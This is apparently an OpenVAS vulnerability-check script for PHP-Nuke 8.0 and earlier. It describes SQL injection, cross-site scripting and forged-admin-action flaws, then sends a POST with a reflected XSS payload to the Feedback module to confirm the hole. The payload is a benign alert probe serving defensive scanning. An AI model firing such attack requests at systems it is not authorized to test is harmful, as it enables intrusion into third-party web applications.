###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_php_nuke_mult_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# PHP-Nuke Multiple Vulnerabilities
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary SQL
  commands, inject arbitrary web script or hijack the authentication of
  administrators.
  Impact Level: Application";
tag_affected = "PHP-Nuke versions 8.0 and prior.";
tag_insight = "Multiple flaws are due to,
  - An improper validation of user-supplied input to 'chng_uid', 'sender_name'
    and 'sender_email' parameter in the 'admin.php' and 'modules.php'.
  - An improper validation of user-supplied input to add user accounts or grant
    the administrative privilege in the 'mainfile.php'.";
tag_solution = "No solution or patch is available as of 27th June, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://phpnuke.org";
tag_summary = "The host is running PHP-Nuke and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(902600);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
  script_cve_id("CVE-2011-1480", "CVE-2011-1481", "CVE-2011-1482");
  script_bugtraq_id(47000, 47001, 47002);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("PHP-Nuke Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/66278");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/66279");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/66280");

  script_description(desc);
  script_summary("Determine if PHP-Nuke is prone to XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach dir (make_list("/nuke", "/php-nuke", "/phpnuke", "/", cgi_dirs()))
{
  sndReq = http_get(item:string(dir, "/index.php"), port:port);
  rcvRes = http_send_recv(port:port, data:sndReq);

  ## Confirm the application
  if('"Powered by PHP-Nuke"'>< rcvRes)
  {

    authVariables = 'sender_name="><img src=x onerror=alert(/OpenVAS-XSS-TEST/'+
                    ')>&sender_email=&message=&opi=ds&submit=Send';
    filename = dir + "/modules.php?name=Feedback";

    ## Construct attack request
    req2 = string("POST ", filename, " HTTP/1.1\r\n",
                  "Host: ", get_host_ip(), "\r\n",
                  "Referer: http://", get_host_ip(), filename, "\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
                  "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                   authVariables);

    ## Posting Exploit
    res = http_keepalive_send_recv(port:port, data:req2);

    ## Confirm the exploit
    if("onerror=alert(/OpenVAS-XSS-TEST/)">< res)
     {
       security_hole(port);
       exit(0);
     }
  }
}
